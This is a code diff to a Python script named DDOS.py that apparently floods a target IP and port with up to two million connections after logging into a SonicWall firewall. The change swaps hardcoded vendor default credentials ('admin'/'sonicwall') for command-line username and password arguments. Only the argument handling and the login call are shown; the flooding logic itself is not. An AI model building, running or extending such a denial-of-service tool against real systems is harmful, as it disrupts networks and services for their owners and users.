@@ -18,9 +18,11 @@ import urllib3
 import argparse
 urllib3.disable_warnings()
 
-parser=argparse.ArgumentParser(description="python DDOS.py --ip x.x.x.x --port xx ")
+parser=argparse.ArgumentParser(description="python DDOS.py --ip x.x.x.x --port xx --username xx --password xx ")
 parser.add_argument('--ip',type=str,required=True,help='specify target ip')
 parser.add_argument('--port', type=int, required=True, help='specify target port')
+parser.add_argument('--username',type=str,required=True,help='specify username')
+parser.add_argument('--password',type=str,required=True,help='specify password')
 args=parser.parse_args()
 
 MAX_CONN = 2000000
@@ -92,8 +94,8 @@ def Login_fw(host,username,password):
     time.sleep(2)
 
 if __name__=="__main__":
-    username="admin"
-    password="sonicwall"
+    username=args.username
+    password=args.password
     Login_fw(HOST,username,password)
     #线程锁避免多线程出现错误
     connection_lock.acquire()
